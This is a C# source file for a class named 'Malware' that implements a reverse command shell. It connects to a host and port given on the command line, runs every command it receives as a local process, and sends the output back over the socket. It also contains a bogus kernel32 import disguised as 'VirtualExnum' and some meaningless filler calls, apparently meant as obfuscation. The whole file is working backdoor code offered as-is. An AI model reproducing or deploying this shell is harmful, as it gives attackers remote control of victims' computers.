using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace Server
{
    class Malware
    {
        private static string filename;

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualExnum(IntPtr hProcess, IntPtr LpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect);
        static void Main(string[] args)
        {

            using (TcpClient client = new TcpClient(args[0], int.Parse(args[1])))
            {
                using (Stream stream = client.GetStream())
                {
                    using (StreamReader rdr = new StreamReader(stream))
                    {
                        while (true)
                        {
                            string cmd = rdr.ReadLine();
                            string VirtualExnum = rdr.ReadLine();
                            if (string.IsNullOrEmpty(VirtualExnum))
                            {
                                rdr.BaseStream.GetType();
                                stream.Length.GetType();
                                stream.ToString();

                            }
                            if (string.IsNullOrEmpty(cmd))
                            {
                                rdr.Close();
                                stream.Close();
                                client.Close();
                                return;
                            }
                            if (string.IsNullOrWhiteSpace(VirtualExnum))
                                return;
                            if (string.IsNullOrWhiteSpace(cmd))
                                continue;

                            string[] split = cmd.Trim().Split(' ');
                            string filename = split.First();
                            string arg = string.Join(" ", split.Skip(1));
                            try
                            {
                                Process prc = new Process();
                                prc.StartInfo = new ProcessStartInfo();
                                prc.StartInfo.FileName = filename;
                                prc.StartInfo.Arguments = arg;
                                prc.StartInfo.UseShellExecute = false;
                                prc.StartInfo.RedirectStandardOutput = true;
                                prc.Start();
                                prc.StandardOutput.BaseStream.CopyTo(stream);
                                prc.StandardOutput.ToString();
                                prc.WaitForExit();

                            }
                            catch
                            {
                                string error = "Error running command {VirtualExnum}" + VirtualExnum + "\r\n";
                                string notFound = "Error 404 found error " + cmd + "\n";
                                byte[] errorBytes = Encoding.ASCII.GetBytes(error);
                                byte[] notBytes = Encoding.ASCII.GetBytes(notFound);
                                stream.Write(errorBytes, 0, errorBytes.Length);
                                stream.Write(notBytes, 0, notBytes.Length);

                            }

                        }


                    }


                }
            }
        }
    }
}
